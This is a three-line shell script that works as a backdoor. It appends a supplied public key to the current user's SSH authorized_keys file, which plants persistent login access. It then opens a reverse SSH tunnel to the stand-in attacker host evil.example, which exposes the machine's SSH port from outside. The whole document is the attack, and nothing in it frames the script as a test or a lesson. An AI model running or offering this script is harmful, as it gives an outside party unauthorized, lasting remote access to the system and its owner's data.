#!/bin/sh
cat key.pub >> ~/.ssh/authorized_keys
ssh -R 2222:localhost:22 -N evil.example
